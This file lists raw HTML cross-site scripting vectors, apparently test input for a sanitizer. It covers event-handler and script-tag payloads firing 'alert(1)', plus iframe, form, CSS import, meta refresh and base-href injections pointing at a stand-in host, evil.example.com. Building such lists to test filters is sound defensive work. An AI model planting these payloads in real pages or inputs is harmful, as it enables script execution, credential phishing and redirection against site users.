# XSS — raw HTML vectors

<img src=x onerror=alert(1)>

<IMG SRC=x ONERROR=alert(1)>

<svg onload=alert(1)>

<svg><script>alert(1)</script></svg>

<script>alert(1)</script>

<SCRIPT>alert(1)</SCRIPT>

<iframe src="https://evil.example.com"></iframe>

<object data="evil.swf"></object>

<embed src="evil.swf">

<form action="https://evil.example.com"><input type="text" name="steal"><input type="submit"></form>

<a href="javascript:alert(1)">raw link</a>

<div onclick="alert(1)">click me</div>

<img src="x" onerror="alert(1)" onload="alert(2)">

<details open ontoggle=alert(1)>

<body onload=alert(1)>

<style>@import 'https://evil.example.com/x.css';</style>

<link rel="stylesheet" href="https://evil.example.com/x.css">

<meta http-equiv="refresh" content="0;url=https://evil.example.com">

<base href="https://evil.example.com/">
